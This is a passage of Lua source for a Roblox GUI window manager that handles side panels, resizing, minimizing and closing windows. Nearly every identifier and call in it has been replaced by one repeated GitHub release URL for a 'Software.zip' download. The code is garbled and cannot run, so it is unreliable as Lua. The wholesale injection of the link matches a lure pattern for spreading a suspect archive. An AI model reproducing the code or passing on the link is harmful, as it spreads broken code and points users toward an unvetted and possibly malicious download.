									if proposedSize + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip <= maxWidth then
										https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = proposedSize
									else
										local newOtherSize = maxWidth - proposedSize
										if newOtherSize >= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = proposedSize
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newOtherSize
										else
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = maxWidth - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
											https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
										end
									end

									updateSideFrames(true)
									sideResized(side)
									sideResized(otherSide)
								end
							end
						end)
					end
				end
			end)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= resizer then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
			end)
		end

		local function renderSide(side,noTween) -- TODO: Use existing resizers
			local currentPos = 0
			local sideFramePos = getSideFramePos(side)
			local template = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do v:Disconnect() end
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()) do if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "WindowResizer" then v:Destroy() end end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil

			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = i
				local isEnd = i == https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				local size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,currentPos)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(size,pos,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)
				if noTween then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = size
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = pos
				else
					local tween = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,sideTweenInfo,{Size = size, Position = pos})
					tweens[#tweens+1] = tween
					tween:Play()
				end
				currentPos = currentPos + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+4

				if not isEnd then
					local newTemplate = template:Clone()
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,currentPos-4)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Size"):Connect(function()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					end)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("Position"):Connect(function()
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0, https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					end)
					sideResizerHook(newTemplate,"V",side,i)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,1,0)
		end

		local function updateSide(side,noTween)
			local oldHeight = 0
			local currentPos = 0
			local neededSize = 0
			local windows = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local height = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,#windows - 1) * 4)

			for i,v in pairs(windows) do oldHeight = oldHeight + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
			for i,v in pairs(windows) do
				if i == #windows then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = height-currentPos
					neededSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100)https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*height),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100)
				end
				currentPos = currentPos + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end

			if neededSize > 0 then
				for i = #windows-1,1,-1 do
					local window = windows[i]
					local newSize = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100))
					neededSize = neededSize - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - newSize)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newSize
				end
				local lastWindow = windows[#windows]
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 100)-neededSize
			end
			renderSide(side,noTween)
		end

		updateWindows = function(noTween)
			updateSideFrames(noTween)
			updateSide(leftSide,noTween)
			updateSide(rightSide,noTween)
			local count = 0
			for i = #visibleWindows,1,-1 do
				visibleWindows[i]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = displayOrderStart + count
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows[i].Gui)
				count = count + 1
			end

			--[[local leftTweenPos = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0))
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(leftTweenPos,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)
			local rightTweenPos = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,5,0,0) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0))
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(rightTweenPos,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.3,true)]]
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,set,mode)
			local oldVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local newVal
			if set == nil then newVal = not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip else newVal = set end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newVal
			if not mode then mode = 1 end

			local resizeControls = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local minimizeControls = {"North","NorthEast","NorthWest","South","SouthEast","SouthWest"}
			for i = 1,#minimizeControls do
				local control = resizeControls:FindFirstChild(minimizeControls[i])
				if control then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not newVal end
			end

			if mode == 1 or mode == 2 then
				self:StopTweens()
				if mode == 1 then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,newVal and 20 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.25,true)
				else
					local maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					local newPos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,newVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(maxY-20,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - 20) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 20))

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(newPos,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.25,true)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,newVal and 20 or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0.25,true)
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = newVal and "rbxassetid://5060023708" or "rbxassetid://5034768003"
			end

			if oldVal ~= newVal then
				if newVal then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,sizeX,sizeY)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sizeX or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sizeY or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,title)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = title
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,val)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,val)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,val)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = val
			self:SetResizableInternal(not val)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not val
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not val
			if not val then
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do if v == self then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,i) break end end
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do if v == self then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,i) break end end
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,self) then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,1,self) end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "rbxassetid://5034768003"
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
				updateWindows()
			else
				self:SetMinimized(false,3)
				for i,v in pairs(visibleWindows) do if v == self then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,i) break end end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "rbxassetid://5448127505"
			end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj,name)
			if type(obj) == "table" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("GuiObject") then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			end
			if name then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name] = obj end
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,obj,name)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[name]
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,side,pos,size,silent)
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,self) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

			size = size or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			if size > 0 and size <= 1 then
				local totalSideHeight = 0
				for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do totalSideHeight = totalSideHeight + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (totalSideHeight > 0 and totalSideHeight * size * 2) or size
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (size > 0 and size or 100)
			end

			self:SetAligned(true)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = side
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sideDisplayOrder + 1
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = sideDisplayOrder end
			pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1, pos or 1)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = pos
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, pos, self)

			if not silent then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end
			-- updateWindows(silent)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			self:SetResizableInternal(false)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,self)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				self:StopTweens()
				local ti = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)

				local closeTime = tick()
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = closeTime

				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,20)})
				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{TextTransparency = 1})
				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{ImageTransparency = 1})
				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{ImageTransparency = 1})
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2)
				if closeTime ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{BackgroundTransparency = 1})
				self:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{ImageTransparency = 1})
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2)
				if closeTime ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			updateWindows(true)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and ((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			return self:IsVisible() and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			moveToTop(self)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			local posX,posY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local maxX,maxY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			posX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(posX,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			posY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(posY,maxY-20)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,posX,0,posY)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,...)
			local tween = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(...)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip+1] = tween
			tween:Play()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				v:Cancel()
			end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = {}
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,data)
			return https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(self,data)
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self,data)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(self,data)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			self:Focus()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(window,data)
			data = data or {}
			local align = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local pos = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local targetSide = (align == "left" and leftSide) or (align == "right" and rightSide)

			if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					window:SetMinimized(false)
				elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,true)
				end
				return
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = tick()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = "rbxassetid://5034768003"
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			window:SetMinimized(false,3)
			window:SetResizableInternal(true)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			if align then
				window:AlignTo(targetSide,pos,size,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			else
				if align == nil and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then -- Regular open
					window:AlignTo(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,size,true)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,true)
				else
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,window) then return end

					-- TODO: make better
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,20)
					local ti = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					window:StopTweens()
					window:DoTween(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,ti,{Size = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)})

					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = size or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(visibleWindows,1,window)
					updateWindows()
				end
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(name)
			local side = (name == "left" and leftSide or rightSide)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end
			updateWindows()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(s,vis)
			local side = (type(s) == "table" and s) or (s == "left" and leftSide or rightSide)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = not vis
			for i,v in pairs(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) do
				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				else
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
				end
			end
			updateWindows()
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
			displayOrderStart = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			sideDisplayOrder = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			sidesGui = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip("ScreenGui")
			local leftFrame = create({
				{1,"Frame",{Active=true,Name="LeftSide",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,}},
				{2,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2549019753933,0.2549019753933,0.2549019753933),BorderSizePixel=0,Font=3,Name="Resizer",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{3,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="Line",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,1,0),}},
				{4,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.2549019753933,0.2549019753933,0.2549019753933),BorderSizePixel=0,Font=3,Name="WindowResizer",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-300,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,4),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),TextSize=14,}},
				{5,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14117647707462,0.14117647707462,0.14117647707462),BorderSizePixel=0,Name="Line",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,1),}},
			})
